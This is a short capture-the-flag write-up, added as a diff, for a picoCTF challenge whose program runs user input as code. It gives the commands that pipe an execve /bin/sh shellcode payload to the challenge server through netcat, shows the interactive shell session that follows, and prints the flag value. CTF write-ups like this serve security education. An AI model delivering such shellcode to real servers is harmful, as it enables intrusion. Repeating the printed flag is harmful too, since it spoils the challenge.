@@ -1,0 +1,27 @@
+The vulnerability in the program lies in the presence of the following line:
+
+    void (*func)() = (void (*)())stuff;
+
+This executes the input bytes as a function. We can use shellcode, to execute /bin/sh
+and give us a shell on the server so we can read the flag.
+
+Looking up execve /bin/sh shellcodes on http://shell-storm.org/shellcode/, we a nice and short one
+which is only 21 characters long!
+
+$ python payload.py > payload
+$ cat payload - | nc shell2017.picoctf.com 24630
+My mother told me to never accept things from strangers
+How bad could running a couple bytes be though?
+Give me 40 bytes:
+ls
+flag.txt
+shellz
+shellz_no_aslr
+xinetd_wrapper.sh
+cat flag.txt
+e7ab8af95673759fa3568c3c38098f16
+
+Our flag is e7ab8af95673759fa3568c3c38098f16
+
+Note: The - in the cat command allows us to keep the pipe open and read from stdin. That
+way, we can use the shell interactively.
